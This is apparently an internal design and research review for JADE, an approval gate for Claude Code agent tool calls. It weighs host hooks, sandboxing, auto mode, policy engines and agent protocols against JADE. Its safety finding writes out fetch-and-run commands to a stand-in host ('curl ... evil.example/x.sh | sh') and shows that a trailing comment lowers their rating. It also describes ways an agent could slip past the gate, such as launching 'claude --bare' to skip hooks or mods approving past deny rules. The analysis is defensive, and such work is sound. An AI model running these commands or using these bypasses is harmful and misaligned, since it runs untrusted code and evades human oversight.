# Competitive research and integration opportunities

This section answers one question. For each tool or standard that touches what JADE does, should JADE integrate it, adopt it cheaply, test it first, or skip it? It is built from six research files (R1 to R6) and from the repo audits (A3, A4, A8) where they matter. It does not repeat discovery. It also challenges the plan: some of what JADE does today may be done better by someone else, and some things that vendors claim are not proven.

**Ref for threat-row ids.** [VERIFIED, `git show origin/main:docs/05-threat-model.md`] A `T` id in this file (T14, T18 to T29) is a row of docs/05 on `origin/main` (e9412f3) unless another ref is named. `T30` is the real-shell harness row on `origin/main`. `T31` and `T32` exist only on unmerged branches (PR 42 and PR 46); the same number means a different row on different refs (d01 B7).

## 0. How to read this section

Tags. [VERIFIED] means a primary source or code was read, and the evidence is named (file, symbol, or research file id such as R1). [INFERENCE] is reasoning. [RECOMMENDATION] is advice. [UNRESOLVED] means it could not be settled. Anything that changes safety behavior is a proposal and needs human approval. It is marked "needs approval".

Settled assumptions (reversible):
- "v6" means the 0.6.x line (tags v0.6.0, v0.6.1), plus `origin/main` after 0.6.1, plus the 0.7.0 candidate branches. [VERIFIED R1, R3, R5: `git describe origin/main` is `v0.6.1-3-ge9412f3`; no tag or file is named v6.]
- PR 48 (`sandbox-real-shell-w115`) is merged into `origin/main`. [VERIFIED R1, R3: `git log origin/main..sandbox-real-shell-w115` is empty.]
- Refs moved during research. Every JADE claim below is about `origin/main` (e9412f3) unless it names another ref.

Source quality. [VERIFIED] is kept for raw page text, code, probes and git. A price, licence, version or default read through a summariser is tagged [INFERENCE, web page via summariser]. Most web facts were read through WebFetch. WebFetch gives a summary made by a small model, not the raw page. So "primary page read through a summariser" is the best level for most items. Where a research file read raw text, it says so. Numbers that came only from search snippets stay secondary. All access dates are 2026-11-16.

Managed hooks. The claim "managed hooks cannot be removed from lower settings levels" is the base of the managed-install proposal in section 2.2. Source: R1 sections 3.1 and 3.4 (the Claude Code hooks page and the managed settings page, read through a summariser). R1 says managed hooks are never removed by lower levels, and that `disableAllHooks` set outside managed settings cannot turn them off. [INFERENCE, web page via summariser; R1] The page does not say what `claude --bare` or `--safe-mode` do to managed hooks. [UNRESOLVED R1.] This section did not fetch the page again and adds no new evidence for it. The managed-settings proposal stays blocked until a real probe in a throwaway HOME passes (spike 2, section 4.2).

## 1. The architect's view first

### 1.1 A safety finding that needs the owner now

This finding does not depend on any integration. It is the most important item in this section. [VERIFIED R6: classification probes 5 to 8, shipped policy, no local overlay, nothing executed.]

- `curl http://evil.example/x.sh | sh` is rated high (R-22, never answered by memory or Jev). The same command with a trailing comment, `curl http://evil.example/x.sh | sh # x`, is rated low (R-99). The same holds for `| bash # run the installer`, `wget -qO- URL | bash # x`, and a Persian comment. This was checked on both `origin/main` and `open-items-scopes`. A comment of 10 characters or more is enough. [VERIFIED R6.] The cause is not traced. [INFERENCE R6: the comment words look like arguments of `sh`.]
- On `open-items-scopes` only (R6 probe3 and probe9 ran there; not repeated on `origin/main`): a Write to `.mcp.json`, `.vscode/settings.json`, `.codex/config.toml` and a project `CLAUDE.md` is rated low (R-99). And a 1,092-character command with `curl ... | sh` in the middle is clipped in the ask text, so the host name `evil.example` is not shown to the human. [VERIFIED R6.]
- Root cause: R-99 matches everything and gives level low. Any command JADE does not recognise is low. OpenHands rates unknown actions as UNKNOWN and confirms them by default. That is the opposite default. [VERIFIED R2 for `policies/risk.yaml`] [INFERENCE, web page via summariser, for the OpenHands docs]

Recommendation (needs approval for any rule change): fix the comment gap first, with a test for the bug and a test for a harmless twin (`echo hi # curl x | sh`). Then measure what share of ledger calls match only R-99 (spike 3). Without that number, nobody can judge "ask on unknown commands" against its friction cost. [RECOMMENDATION R6 and this section.]

### 1.2 Five findings that change the plan

1. **The cheapest way to cut prompts is not JADE's.** Anthropic reports that users approve about 93% of manual prompts. [INFERENCE: vendor figure via summary; R1 and R5 read the auto-mode post of 2026-03-25; R6 left this number out as secondary only.] It reports that a sandbox cut prompts by 84% in internal use, with no method given. [R1 reads two Anthropic sources and calls it verified; R5 saw only a search snippet and calls it secondary. The sources disagree on confidence.] Auto mode (a model reviewer) has a published 0.4% false positive on 10,000 real calls and a 17% false negative on 52 real overeager actions. [INFERENCE: vendor figure via summary; R1 and R5 agree.] JADE's own figures: 57% of past verifications would not return "yes" at the default bands, and 20% of calls re-asked an identical question. [VERIFIED README Status table, repo docs/04.] Calling these "similar" to prompt approval rates is R1's [INFERENCE]. So "minimum human friction" is best served first by containment and by the host's own reviewer. JADE should own what neither covers. [INFERENCE]
2. **JADE's likely differentiator is "who may say yes", plus the record and the calibration discipline. It is not shell parsing and not a state machine.** In the nine runtime docs read in R2, no page describes authenticating the approver. OpenAI's page says outright that saved run state is not authenticated. [INFERENCE: absence of a statement in pages read through a summariser; R2 line 210. R3 has no finding either way.] Two gaps in that check: R3 records that Microsoft AGT has a `require_approval` action with named approvers and an identity scope, which this section did not examine; and the Inngest and Microsoft Agent Framework human-in-the-loop pages were not read. Cursor, Gemini, Cline and Codex approval flows were not read in depth. So read the claim as "no page read describes it", not "nobody does it". The shell classifier is a cost and a risk, not an asset: Claude Code had at least eight parser-differential advisories in 2025 and 2026. [INFERENCE R6: counted from advisory titles; about 36 advisories were read as titles on four list pages; most were not read beyond the title.] JADE's own gap is in section 1.1.
3. **The best integration is already in the host.** Native hooks, `onFailure: "block"`, managed settings, sandbox, deny rules and `defer` cover most of what a competitor stack would add. Most outside engines add a new process and a new failure path inside a hook that the host runs fail-open by default, and add no new safety. [VERIFIED R1, R3 for the host facts; INFERENCE for the net judgment.]
4. **"Measurable decision accuracy" is a design today, not a result.** README says VALIDATED: No. [VERIFIED R5.] Jev's own docs page shows no calibration numbers. [VERIFIED R5: docs.typesafe.ai.] Labels exist only for calls that were accepted and then ran. So the false-reject rate and the effect of a looser threshold cannot be measured from the ledger. This is the selective-label problem: you only see the result of what you allowed. [VERIFIED R5: `evals.auto_label`.] No competitor solves this either.
5. **The research supports zero new runtime dependencies.** JADE has three pure-Python runtime packages. [VERIFIED R3: pyproject.toml.] Every tool below that would add a binary, a server or a native wheel loses on cost against what it adds. The one dev-only candidate is `tree-sitter-bash` as a second opinion in tests. [RECOMMENDATION]

### 1.3 Challenge to the owner's spec

The spec says fewer approvals is not better unless safety is kept. That is right but it mixes two different things. This section keeps them apart. [RECOMMENDATION]

- **Safety** is how many calls run with any containment at all. Measure it. Today JADE is the only gate for almost every call: 3,416 of 3,424 gated calls in the last 7 days ran with no host prompt, because the host runs auto or bypass. [VERIFIED A3: the `jade check` host-prompt line.] Containment (sandbox, scoped tokens, branch protection on the remote) lowers risk. Asking fewer questions does not.
- **Autonomy** is how often JADE asks. Measure it as JADE asks per 100 gated calls, by rule id. The only data: on the maintainer's own machine, which is also developing JADE, 2,666 gated calls in 14 days led to 100 chat or dialog asks and 20 terminal approvals. That is about 4.5% of gated calls. R-16 had 65 asks (19 unanswered) and R-14 had 35. [VERIFIED A8; the 4.5% is A8's INFERENCE; one machine only.] The host's own prompts are close to zero on this Mac, so "prompts per day" cannot show a gain. JADE's asks are the friction to cut.
- **Accuracy** must not be reported as "the model agreed with the owner". If the owner approves 93% of prompts, a model that always says yes agrees 93% of the time. Report deny-recall (how many bad calls were stopped) and the false-allow rate, each with an honest interval. [VERIFIED R5: line 102 arithmetic; the owner's own deny rate is UNRESOLVED.]
- The "17% miss rate" belongs to Anthropic's auto-mode classifier, not to Jev. No Jev miss rate exists. [VERIFIED: README VALIDATED No; R5.] So "Jev is the weakest part" is not a measured claim. What is true: letting any model decide more, before containment is on, moves risk onto a part nobody has measured. [INFERENCE]

## 2. The Claude Code native layer

Each entry says what it solves, what overlaps with JADE, what it does better, what JADE should do, the limits, how JADE differs, and what is missing in both. Entries for tools that get "Skip" are shorter and sit in section 3.

### 2.1 Hooks (PreToolUse and others)

Source: https://code.claude.com/docs/en/hooks (accessed 2026-11-16). [VERIFIED R1, raw text for parts; summariser for the rest.]
- **Solves.** Runs your code at 31 lifecycle points. PreToolUse can allow, deny, ask, defer, or rewrite input. Exit code 2 blocks, and a JSON "allow" cannot override it.
- **Overlap.** JADE is built on this: PreToolUse (timeout 130 s), PostToolUse, PostToolUseFailure, Stop, SessionStart, and `"onFailure": "block"` on hosts 2.1.295 or newer. [VERIFIED R1: `jade/ops.py:38-39, 462, 554`.]
- **Better than JADE.** The host owns the loop. It resumes, merges settings, and fires hooks inside subagents. [VERIFIED R1.]
- **Use.** Keep using it. Not used yet: `PermissionRequest`, `PermissionDenied`, `defer`, `if` filters, `Elicitation`, `SubagentStop`. [VERIFIED R1: grep on 8 refs, 0 hits.]
- **Limits.** Fail-open by default on crash or timeout (fixed by `onFailure`, 2.1.295+). Same-user code can edit `~/.claude/settings.json` unless something stops it. Project hooks run in `claude -p` with no trust dialog. [VERIFIED R1.] Hook output is capped at 10,000 characters. [VERIFIED R6.]
- **JADE differs.** Hooks give the hook point. They give no approver identity, no memory, no ledger, no calibration.
- **Open.** The docs and JADE's probe disagree on whether a hook `ask` reaches the owner in auto and bypass modes. On 2.1.314 it did not. [VERIFIED R1: RESULTS.md cells 1, 2, 11.] Re-probe on the current host. [UNRESOLVED]

### 2.2 Managed settings

Source: https://code.claude.com/docs/en/managed-settings and /hooks. [INFERENCE, web page via summariser; R1; see section 0.]
- **Solves.** A root-owned settings file (macOS: `/Library/Application Support/ClaudeCode/managed-settings.json`) that ranks above user and project settings. Managed hooks are merged and cannot be removed from below.
- **Overlap.** JADE's tamper rows (T19, SI-09 to SI-12, HO-wiring). JADE protects its hooks by blocking edits at its own gate and by `jade check` afterwards. It installs only into `~/.claude/settings.json`. [VERIFIED R1: ops.py.]
- **Better than JADE.** A root-owned file the agent's user cannot write. A new shell, a new `claude`, or an editor cannot undo it.
- **A risk that exists today.** JADE never mentions `claude --bare` or `--safe-mode`. The headless page says `--bare` skips hook discovery. An agent could start `claude --bare -p ...` as a child through Bash and run with no JADE hooks. The launch itself is rated low (R-99). [VERIFIED R1 line 35 and 120; A3 shows child `claude -p` launches rated low R-99. Whether the user-level hooks are skipped is UNRESOLVED R1.] This is a possible bypass of today's user-level wiring, not only a limit of the managed idea.
- **Use.** Two steps, both need approval. Step 1: run the probe first (spike 2): do user and managed hooks run under `--bare` and `--safe-mode` as a child of the agent? Step 2, if managed hooks do not help or the probe cannot be run: add a gate rule and a new human-only class for starting `claude` with those flags. [RECOMMENDATION R1.] Only if the probe passes: a human-only `jade setup --managed` (sudo, run in a terminal by the owner) that writes the same five hook entries to managed settings. Do not set `allowManagedHooksOnly` (it would block the owner's other hooks). Show the dry-run result before any real run (owner rule).
- **Limits.** Needs admin rights. One Mac makes the file a single point of failure. Behavior of invalid managed settings was not read. [UNRESOLVED]
- **Missing in both.** Defense against pre-trust execution (repo config, MCP auto-start, `ANTHROPIC_BASE_URL`). It ran before hooks loaded in the Check Point cases. [VERIFIED R6.] Only the vendor can fix it.

### 2.3 Sandbox

Source: https://code.claude.com/docs/en/sandboxing; anthropic.com/engineering/claude-code-sandboxing (2025-10-20). [INFERENCE, web page via summariser; R1]
- **Solves.** An OS boundary for Bash and child processes: macOS Seatbelt, Linux bubblewrap. Writes limited to the working directory; network only through a proxy with `allowedDomains`. Off by default. Not covered: Read, Edit, Write, WebFetch, MCP servers, hooks.
- **Overlap.** None. JADE has no containment. README says the gate is "not a boundary against one that is adversarial". The classifier has documented gaps (T18 in repo docs/05 on `origin/main`). [VERIFIED R1, R3.]
- **Better than JADE.** It does not need to understand the command. It answers the base64, eval and variable gaps (T18) and the secret-read and egress gaps (T22) at the OS level.
- **Use.** Make "sandbox on" a documented layer and a `jade check` row (`sandbox.enabled`, `failIfUnavailable`, `allowUnsandboxedCommands: false`, a credential deny for `~/.ssh`, `~/.aws`, `~/.open-vault`, a short `allowedDomains`). [RECOMMENDATION R1, R3.] Measure JADE asks per 100 gated calls, by rule id, before and after (spike 6).
- **Safety rule for this idea (needs approval).** "Sandbox on" must never lower a JADE level on its own. The hook cannot tell whether one given call ran inside the sandbox, because of `excludedCommands` and `dangerouslyDisableSandbox`. Lowering a level only after a per-call proof is a safety change and needs approval. [INFERENCE R1.]
- **Limits.** Some tools break (git over SSH on macOS through the proxy). The proxy does not inspect TLS. `excludedCommands: docker *` gives full access. `dangerouslyDisableSandbox` exists. Whether the sandbox applies when the host runs `bypassPermissions` is not stated in the pages read. [UNRESOLVED R1.] Whether it is enabled on the owner's Mac is not known. [UNRESOLVED] The runtime repo name (`anthropics/` or `anthropic-experimental/`) is unresolved. [UNRESOLVED R1.]
- **JADE differs.** Complementary. The sandbox contains. JADE decides, asks, and records.
- **Missing in both.** A sandbox plus an authenticated approver in one product. Anthropic's own 2026-05-25 post says an allowed domain was used for exfiltration. [INFERENCE, web page via summariser; R1]

### 2.4 Auto mode

Source: https://code.claude.com/docs/en/permission-modes; anthropic.com/engineering/claude-code-auto-mode (2026-03-25). [INFERENCE, web page via summariser; R1, R5, R3]
- **Solves.** A second model reviews each action not covered by rules. It sees user messages, tool calls and CLAUDE.md, with tool results stripped. After 3 blocks in a row or 20 in total it falls back to prompts.
- **Overlap.** The same goal as Jev deciding in the owner's place at levels low and medium (repo docs/12 section 9, W-102). Different method: transcript model, versus deterministic rules plus owner memory plus a Jev probability bar. Its block defaults (force push, production deploy, IAM grants, `git reset --hard`) overlap some JADE human-only classes. JADE adds money, release, wiring, terminal panel, mods. [VERIFIED R1 for both lists; the comparison is INFERENCE.]
- **Better than JADE.** Tool-result stripping, subagent checks at delegation and at the final report, no extra provider key, no data sent to OpenRouter.
- **What JADE does and does not send to Jev.** Never sent to Jev: human-only classes, calls an SI rule blocks, critical calls, fetch-and-run (R-22), writes to agent instruction files, merges, calls the gate could not read fully, calls over 4 KiB, and egress (R-21) except at level `low` with bar 0.85. Sent to Jev (at low and medium): plain high shell calls such as R-10 and R-11. [VERIFIED `jade/proxy.py` `skip_reason` on `origin/main`; A4 table lines 94 to 106.] So the contrast with auto mode is smaller than R3's line "human-only classes that are never sent to a model" suggests.
- **Use.** Treat it as the baseline layer for ordinary risk. Do not build a second classifier model unless data shows a gap. An offline replay of 50 calls against auto mode is not possible and is dropped: there is no API to run Anthropic's classifier over old logged calls, 50 answers hold only about 3.5 owner denies at a 7% deny rate (a number borrowed from the 93% figure), and about 97 denies are needed for a useful deny-recall interval. [VERIFIED R5: `stats3.py` arithmetic; the owner's own deny rate is UNRESOLVED.] What to do instead: measure Jev-decides by the count of owner denies in the shadow period (30 minimum, 100 target), not the count of answers. [RECOMMENDATION R5.] State plainly that auto mode and Jev cannot be compared on the same calls with the data that exists. [INFERENCE]
- **Limits.** Probabilistic. 17% miss on 52 real cases (Wilson about 9% to 30%, derived by R5 from the post's numbers). Anthropic says it is not a replacement for careful review on high-stakes infrastructure. Availability on this Mac's gateway-routed models is unknown. [UNRESOLVED R1.] The two research files name the classifier model differently (Sonnet 5 on the docs page, Sonnet 4.6 in the March post). [UNRESOLVED]
- **JADE differs.** Every answer goes to a ledger with an owner-answer shadow period. Double gating (JADE passes, the classifier blocks, or the reverse) is possible. [INFERENCE R1.]
- **Missing in both.** A public, calibrated measure of correctness for gate decisions. Anthropic gives rates with wide intervals on small real sets. Nobody gives per-decision calibrated probabilities.

### 2.5 Permission rules and a native deny floor

Source: https://code.claude.com/docs/en/permissions (accessed 2026-11-16). [VERIFIED R1, raw text.]
- **Solves.** Static allow, ask, deny rules. Order: deny, ask, allow; first match wins. Compound commands are split on `&&`, `||`, `;`, `|`, `|&`, `&`, newline; deny and ask match inside `$()` and subshells. A hook `allow` does not beat a deny or ask rule. The page says a deny rule is "not a security boundary around a program" and to pair it with the sandbox.
- **Overlap.** JADE's allow and deny matching, and its shell parser stack (about 4,100 lines across shellnorm, interp, samecmd, inert, blind). [VERIFIED R3.]
- **Better than JADE.** A documented, versioned parser the vendor keeps.
- **Use (needs approval).** A small native deny floor in managed settings, only for things no approval may ever lift. Examples: push to the default branch, rewriting hook wiring. These are SI-style items. Do not put rules there that the owner may approve through a JADE permit (the high R-xx rules): a native deny cannot be lifted by a permit and would block the owner's own approved work. Keep `policies/safety.yaml` as the single source. Add a test that the native list and the safety list agree, because native pattern syntax differs from JADE's regex. [RECOMMENDATION; INFERENCE on drift risk.]
- **Limits.** No levels, no human-only class, no permit. The native parser is not exposed to hooks. [UNRESOLVED R3.]
- **Missing in both.** A shared tested corpus of parser-differential cases across vendors. Claude Code, Gemini CLI (a grep allowlist) and JADE all hit the same class. [VERIFIED R6 for the incidents.]

### 2.6 `defer`, `PermissionRequest`, ask rules, the SDK callbacks, and the mods guard

- **`defer`.** A PreToolUse decision that ends a `-p` turn and resumes with `claude -p --resume <id>`. Works only in `-p`, one tool call per turn, no timeout, ignored with a warning in interactive mode. [INFERENCE, web page via summariser; R2 and R1, hooks page.] JADE today blocks and waits for a signed permit. JADE never probed it. [UNRESOLVED R2.] It is the host-native pause, so test it before building any custom wait.
- **`PermissionRequest` and settings `ask` rules.** A settings `ask` rule is never auto-approved by any mode (permissions page, raw). JADE's probe never tested it. [VERIFIED R1: no probe cell; cell 6 "not run".] It may be a native channel for fixed classes such as HO-money. [INFERENCE R1.]
- **`canUseTool` and `--permission-prompt-tool`.** These are in-process or app-level answers for the Agent SDK. Auto-approved calls never reach `canUseTool`. They are not a replacement for the signed out-of-band permit. [VERIFIED R1 lines 147, 152, 253.]
- **Mods guard.** Mods run inside Claude Code and can approve a call before the user is asked. A built-in guard `cc-plugin-sec-default` loads only with managed settings or a Team or Enterprise login. Without it a mod can approve past deny rules and PreToolUse hooks. [VERIFIED R1, raw text: mods admin page.] Whether the guard is loaded on this Mac is open (probe cell 13). [UNRESOLVED] Do not write a JADE mod: settings hooks with `onFailure: block` are stronger. [RECOMMENDATION R1.]

## 3. Everything else

### 3.1 Agent runtimes and durable execution

Framing answer. [RECOMMENDATION R2] JADE does not need its own durable runtime. The harness owns pause and resume at the tool boundary. Every engine below needs the agent loop written inside its own workflow code. JADE governs an agent it did not write, so moving to a workflow engine would mean owning the agent loop: a different product. JADE already has what approval needs: a persisted wait (`WAITING_HUMAN`), idempotent events (`events.idempotency_key TEXT UNIQUE`), and SI-07 (`OUTCOME_UNKNOWN`, never `EXPIRED`; the command stays blocked until `jade decide outcome` reconciles it). [VERIFIED R2: `jade/state_machine.py`, `jade/ledger.py:37`, tests read by `git grep`, not run.] R2's wording of the gap: JADE lacks not durability but resume of the agent after a human answer, and the harness already does that (chat answer, `defer`). [VERIFIED R2 line 35.] An automatic reconcile of an unknown outcome is a separate possible gap and is only this section's [INFERENCE].

Load check. JADE's measured load is far below what these engines are built for: 3,424 gated calls in 7 days (about 490 a day, A3) and 2,666 in 14 days (about 190 a day, A8) on one Mac. [VERIFIED A3, A8.] An older figure of about 65 calls a day (ADR-01, repo docs/04 baseline) is stale and is not used.

Decision for the group: Skip. No evidence in the repo that any user needs a recipe. If one appears, a thin recipe is enough: a tool wrapper that calls the JADE gate and passes the idempotency key. [RECOMMENDATION R2] All rows are [INFERENCE, web page via summariser; R2] unless marked.

| Tool | Why skip for the gate |
|---|---|
| OpenHands | Works only for agents built on its SDK. Its page says `conversation.execute_tool()` bypasses the analyzer and that it has no hard-deny at the analyzer boundary. Borrow two ideas, not code: max risk over several analyzers, and UNKNOWN as a rating (section 1.1). `enterprise/` license unresolved. |
| LangGraph | `interrupt()` resume is by whoever holds the `thread_id`; the page describes no approver check [INFERENCE]. Code before `interrupt()` runs again on resume. |
| Temporal | Needs a server and a database, or Cloud (Business plan from $500 a month per its pricing page [INFERENCE, web page via summariser]). Approver identity is the integrator's job [INFERENCE]. |
| DBOS | MIT library on Postgres. The only design cousin of ADR-01. Look again only if ADR-01's multi-host trigger fires. |
| Restate, Inngest | BUSL-1.1 and SSPL [INFERENCE, web page via summariser; R2 read the LICENSE files, the licence names are not legal advice]: poor dependencies for an MIT project. Inngest HITL page not read [UNRESOLVED]. |
| CrewAI | Durable human path is an Enterprise feature. |
| OpenAI Agents SDK | Its page says snapshots are not authenticated, approval "does not guarantee exactly-once execution", `always_approve` can be sticky across handoffs, and built-in shell and apply_patch skip the tool-guardrail pipeline. JADE has no known stable library entry point for it [UNRESOLVED]. |
| Microsoft Agent Framework | Checkpoints use pickle with a restricted unpickler; its page calls storage a trust boundary. HITL page not read [UNRESOLVED]. Middleware could host a JADE gate on demand. |

### 3.2 Policy engines and guardrails

Framing answer. [RECOMMENDATION R3] Keep the deterministic layer (shellnorm, rules, permits) custom. An engine replaces only the "match" step. The expensive part is turning a shell string into trusted facts: about 4,122 lines (shellnorm 1384, interp 917, samecmd 892, inert 574, blind 355). [VERIFIED R3.] No engine read parses shell. JADE's rules are Python regex with look-around: 32 lines in `policies/risk.yaml` and 5 in `policies/safety.yaml` use `(?<` or `(?!`. [VERIFIED R3: `git grep`.] That OPA uses RE2 (no look-around) and that Cedar has no regex are R3's [INFERENCE]; no primary source was read. A new outside decision point adds a crash and timeout path inside a hook that is fail-open by default. [VERIFIED R3: hooks doc, `jade/hooks.py:354-372, 898-944`.]

All items below: Skip for the gate. [INFERENCE, web page via summariser; R3 unless marked]
- **OPA (Rego).** Replaces only the match step and adds a process. Its decision-log page says events above `max_decisions_per_second` are dropped: the wrong default for an audit trail. Latency not measured [UNRESOLVED]. Option: write decisions in an OPA-decision-log-like JSON shape, with no engine in the hot path.
- **Cedar.** Allow or deny only; JADE needs level, rule id and reversibility. A policy that errors is skipped, which in a safety gate is a silent allow unless the caller checks errors: the reverse of JADE's fail-closed. `cedarpy` is a native wheel. What Cedar does better is policy-change analysis ("did this rule change alter what is allowed"); JADE has 110 test files plus replay. Look again when a rule change cannot be tested by replay in a time the owner accepts. A claim that Keycard runs Cedar in a Claude Code hook is a search summary only [UNRESOLVED].
- **Invariant Guardrails (Snyk).** Rules over traces of calls, through a gateway proxy. The README does not mention Claude Code. Repo quiet since 2026-01-12, owned by Snyk since 2025. Keep the idea of rules over call sequences. JADE does per-call egress (R-21) and records reads (`blind`): PARTIAL [INFERENCE].
- **NeMo Guardrails, Guardrails AI.** Wrong layer: rails around LLM text, not tool calls. NeMo's README says Apache-2.0 but the GitHub API says NOASSERTION.
- **LlamaFirewall.** The only candidate for the missing injection scan of tool results. Needs torch, transformers and Hugging Face access; mixed licenses (subdirectory MIT, repo root Llama 3.2 Community License, weights unresolved [UNRESOLVED]). Watch only.
- **Microsoft Agent Governance Toolkit (AGT).** The biggest overlap: YAML policies, `govern()`, `require_approval` with named approvers, a Claude Code plugin (hook details not described). Its own `docs/LIMITATIONS.md` (reviewed 2026-08-16) says: no shell parsing, the engine shares a process with the agent, no approval workflow beyond a policy action, audit records attempts not verified outcomes, and with no policies loaded or in `permissive` mode the default is allow. Its README says "10/10 OWASP Agentic Top 10" in text and "7 Full, 3 Partial" in a badge: treat coverage as marketing until tested. Read its specs for ideas (outcome attestation, intent declaration). Its named approvers and identity scope were not examined.
- **Cerbos and OpenFGA.** Cerbos is built for teams (Synapse maps a hook payload to a policy check). It sends commands and file content to a PDP and a hub, so it needs a privacy review; pre-1.0; pricing unresolved. Use only if JADE becomes multi-user. OpenFGA has no overlap with a single-user command gate.
- **Snyk `agent-scan` (formerly `mcp-scan`).** Might fill JADE's "no tool-description pinning" gap. R3 saw only search summaries and a GitHub redirect for the rename. [UNRESOLVED] Read it before any decision.

### 3.3 Protocols and standards

| Item | What it is | What JADE does | Decision and reason | Evidence |
|---|---|---|---|---|
| MCP core | Wire protocol for tools, resources, prompts. Current revision 2026-07-28 is stateless (no `initialize`, new `server/discover`) | Gates MCP tools by name through `mcp__.*` and rules M-01 to M-05; unnamed tools fall to M-99 (medium, listed by `jade check`, not gated) | Integrate (already done). Stay hook-based. A JADE MCP server would be advisory (an agent can skip it). A proxy would cover MCP calls only, not Bash or Write | R4, summariser; `jade/ops.py:26-34`, `policies/risk.yaml:282-295`. [VERIFIED for the JADE side (code); [INFERENCE, web page via summariser for the MCP revision and the proxy claim] |
| MCP annotations (`readOnlyHint`, `destructiveHint`) | Hints about a tool | None. The spec says treat them as untrusted unless the server is trusted. Claude Code hook input lists no annotation field in the part read | Optional `jade check` audit row that lists tools whose annotation disagrees with JADE's rule. It may only tighten, never lower a level. Low priority | R4. [VERIFIED; rest of hooks page UNRESOLVED] |
| MCP elicitation, authorization, roots | Server asks the user; OAuth for HTTP; directory hints | An `Elicitation` hook can answer with no dialog, so it is hook-answerable and not human-only. OAuth is HTTP only; JADE is local. Roots are deprecated and not a boundary | Skip | R4, raw hooks text. [VERIFIED] |
| A2A | Agent-to-agent tasks, Agent Cards, signed cards | No inter-agent channel | Skip (watch). An A2A reply is untrusted data and a new injection source: add a threat row first if the harness ever receives A2A tasks. v1.0 is the first stable spec; the release date is unresolved (LF press release 2026-04-09; a secondary source says about 2026-03-12, and mentions a v1.0.1 in May 2026). Its license was not read | R4. [INFERENCE, web page via summariser; date UNRESOLVED] |
| AGENTS.md | Plain Markdown project instructions read by Codex, Cursor, Copilot and others | `jade setup` edits only the user-level `~/.claude/CLAUDE.md` Jev section. Claude Code reads `AGENTS.md` only if no `CLAUDE.md` exists, unless CLAUDE.md imports it | Keep only a `jade check` row that says which instruction file the host reads. Writing Jev text into `AGENTS.md` is an optional chore outside the architecture (text, not enforcement; docs/05 section 4) | R4; `jade/setup.py:104`. [VERIFIED] |
| Agent Skills format | `SKILL.md` folder with frontmatter | `skills/jade/SKILL.md` has only `name` and a 331-character description, which meets the minimum | Optional chore outside the architecture (`license`, `compatibility`, a validator). Never use `allowed-tools` (it would widen what runs with no prompt) | R4: file read; `skills-ref` not run. [VERIFIED] |

Steward: MCP spec is Apache-2.0 and docs CC BY 4.0; the Agentic AI Foundation under the Linux Foundation stewards MCP (announced 2025-12-09). [INFERENCE, web page via summariser; R4.] Nobody pins or hashes tool descriptions (the rug-pull problem; Invariant Labs blog 2025-04-01). JADE has no pinning either. [VERIFIED R6; grep.]

### 3.4 Observability

- **OpenTelemetry GenAI conventions.** Spans, metrics and events for model calls, agents, tools and MCP. They are all at Development stability, and the repo has no tagged release. [INFERENCE, web page via summariser; R4.] JADE has no OTel, OTLP or `traceparent` code on any ref. Decision rows carry `trace_id` and `session_id`; `tool_use_id` is not a stored join key. [VERIFIED R4: grep on 8 refs.] Claude Code already emits `claude_code.tool_decision` events keyed by `tool_use_id`, with source `hook`. [INFERENCE, web page via summariser; R4: monitoring page.] **Decision: do not build.** There is no demonstrated need, and whether the owner has an OTLP backend is unknown. [UNRESOLVED] If an owner names a backend later, first test whether the host's own events already join to JADE's rows, because that may need no JADE change.
- **OpenInference** (Apache-2.0, built on OTel, with `GUARDRAIL` and `DECISION` span kinds). Spec version and release status unresolved. Skip. [INFERENCE, web page via summariser; R4]

### 3.5 Other harnesses, tokens, parsers, isolation, and git-side limits

Other harness approval systems. Sources: learn.chatgpt.com/docs, cursor.com/docs/agent/hooks, geminicli.com/docs, docs.cline.bot, aider.chat. [INFERENCE, web page via summariser; R1. Gemini, Cursor sandbox and Cline hooks: partly secondary or not read.]

| Harness | Pre-tool hook, block signal | Fail mode | Own reviewer or sandbox |
|---|---|---|---|
| Claude Code | PreToolUse, exit 2 | fail-open unless `onFailure: block` (2.1.295+) | auto mode, sandbox |
| Codex CLI | PreToolUse, exit 2; no `ask` | fail-open; no switch found | `approvals_reviewer = "auto_review"`, Seatbelt or bwrap |
| Cursor | preToolUse and others, exit 2 | fail-open unless `failClosed: true` | not read |
| Gemini CLI | BeforeTool, exit 2 | not read | sandbox options; status unresolved |
| Cline | hooks return `cancel: true` | not read | auto-approve toggles |
| Aider | none | none | none |

Claude Code, Codex and Cursor share "run my script before a tool call and let it block" with exit 2; JSON shapes differ. [INFERENCE, web page via summariser; R1.] Decision: skip any second adapter until the owner uses a second harness. JADE has one adapter today, so "harness-neutral" is a design intent, not a shipped fact. [INFERENCE] Codex docs call hooks "a useful guardrail, not a complete enforcement boundary" (R1, summariser).

Other items:
- **OS or container isolation outside the host's sandbox** (devcontainer, Docker, a VM for the agent). Not covered in R1 to R6 beyond the host sandbox. A real option for stronger containment than the host's sandbox, with its own setup cost. [UNRESOLVED: not researched. RECOMMENDATION: ask the owner whether the agent could run in a container; JADE would then need no code.]
- **Git-side enforcement** (branch protection, scoped credentials, server-side hooks). A token that can only do X beats a regex for "never push to main". Claude Code on the web keeps git credentials outside the sandbox and a proxy checks the push target before the real token is attached. README already says remote branch protection is the real enforcement. [INFERENCE, web page via summariser; R3, sandboxing article.] Decision: this is the cheapest strong control for the push classes and should be checked by `jade check` where the remote allows it. [RECOMMENDATION]
- **Capability tokens** (macaroons, Biscuit, OAuth RAR, RFC 9396). RAR is the closest concept to a JADE permit. JADE's signed message already binds permit id, plan hash, preconditions digest, policy version, risk, principal, expiry and nonce. [VERIFIED R3: `jade/signing.py:72-77`.] Macaroons and Biscuit fit delegation from one agent to a sub-agent. JADE has one owner and no delegation story. Skip.
- **Shell parsers.** (PyPI JSON, accessed 2026-11-16. [VERIFIED R3.]) `tree-sitter-bash` 0.25.1 (MIT, 2025-12-02) plus `tree-sitter` 0.26.1 gives a real syntax tree and no meaning (aliases, git global options, runner prefixes, heredoc-fed interpreters). `bashlex` 0.18 is GPLv3+ and stale since 2023: reject. `shfmt-py` 4.2.0 installs a binary; parser license unresolved. Claude Code's own parser is not exposed to hooks as far as read. Decision: one dev-only differential test (spike 7), never in the runtime path. The sandbox is the only complete answer to parser differences, and both the vendor and JADE say so.
- **Tool-description pinning.** See `agent-scan` in section 3.2. JADE has none.

### 3.6 Evaluation and calibration tooling

Sources: arXiv abstracts (most read as abstract only); GitHub metadata for `inspect_ai`, `inspect_evals`, `ppi_py`, MAPIE; Epoch AI review of SWE-bench Verified. [VERIFIED R5 for the access; method details mostly unread.]
